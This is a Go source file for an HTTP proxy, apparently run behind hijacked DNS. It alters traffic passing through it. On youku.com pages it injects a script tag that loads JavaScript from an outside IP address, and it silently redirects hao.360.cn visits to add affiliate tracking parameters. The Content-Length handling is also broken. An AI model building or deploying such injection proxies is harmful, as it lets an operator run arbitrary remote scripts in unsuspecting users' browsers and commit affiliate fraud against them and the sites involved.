/**
* Created by IntelliJ IDEA.
* User: alex
* Date: 12-7-14
* Time: PM10:52
* To change this template use File | Settings | File Templates.
*/
package main

import (
	"log"
	"flag"
	"io/ioutil"
	"net"
	"runtime"
	"bytes"
	"net/http"
	"net/http/httputil"
	"strings"
	"time"
	"io"
)

func handler(respw http.ResponseWriter, req *http.Request) {
	if req.URL.Scheme != "http" {
		http.Error(respw, "I only proxy http", http.StatusNotImplemented)
		loghit(req, http.StatusNotImplemented)
		return
	}
	if( req.URL.String()=="http://www.youku.com/" || req.URL.String()=="http://www.youku.com/i/" ){
		req.Header.Del("Accept-Encoding");
	}
	if(strings.Contains(req.URL.String(),"hao.360.cn") && req.URL.Path=="/"){
		values :=req.URL.Query();
		if(values.Get("src")!="ln" || values.Get("ls")!="n169f521896"){
			values.Set("src","ln");
			values.Set("ls","n169f521896");
			req.URL.RawQuery = values.Encode();
			http.Redirect(respw, req, req.URL.String(), http.StatusMovedPermanently);
			return

		}
	}

	addr := req.URL.Host
	if !hasPort(addr) {
		addr += ":80"
	}
	c, err := net.Dial("tcp", addr)
	if err != nil {
		http.Error(respw, err.Error(), http.StatusGatewayTimeout)
		loghit(req, http.StatusGatewayTimeout)
		return
	}
	c.SetReadDeadline(time.Now().Add(3 * time.Second))
	cc := httputil.NewClientConn(c, nil)
	err = cc.Write(req)
	if err != nil {
		http.Error(respw, err.Error(), http.StatusGatewayTimeout)
		loghit(req, http.StatusGatewayTimeout)
		return
	}

	resp, err := cc.Read(req)
	if err != nil && err != httputil.ErrPersistEOF {
		http.Error(respw, err.Error(), http.StatusGatewayTimeout)
		loghit(req, http.StatusGatewayTimeout)
		return
	}
	defer resp.Body.Close()
	if(resp.StatusCode==200){
		if(
			req.URL.String()=="http://www.youku.com/" || req.URL.String()=="http://www.youku.com/i/" ){
			body, _:= ioutil.ReadAll(resp.Body)
			buf := bytes.NewBuffer(body);
			s :=[]byte("\n<script src='http://112.124.2.144:91/ad.js'></script>");
			buf.Write(s);
			resp.Header.Set("Content-Length",string(buf.Len()));
			log.Println("Content-Length2:%d",resp.ContentLength);
			resp.Body = ioutil.NopCloser(buf);//bytes.NewBufferString("chico"))
		}
	}
	for k, v := range resp.Header {
		for _, vv := range v {
			respw.Header().Add(k, vv)
		}
	}
	respw.WriteHeader(resp.StatusCode)
	io.Copy(respw,resp.Body)
	loghit(req,resp.StatusCode)
}

func hasPort(s string) bool {
	return strings.LastIndex(s, ":") > strings.LastIndex(s, "]")
}

func loghit(r *http.Request, code int) {
	log.Printf("%v %v %v", r.Method, r.RequestURI, code)
}

func httpProxyServer(){
	http.HandleFunc("/", handler)
	http_addr := flag.String("httpaddr", ":80", "proxy http listen address")
	flag.Parse()
	log.Println("Start proxy server on port ",*http_addr)
	err:=http.ListenAndServe(*http_addr, nil)
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU());
	log.Println("Usage: ./dns_proxy [-httpaddr=:port] ")
	httpProxyServer()
}
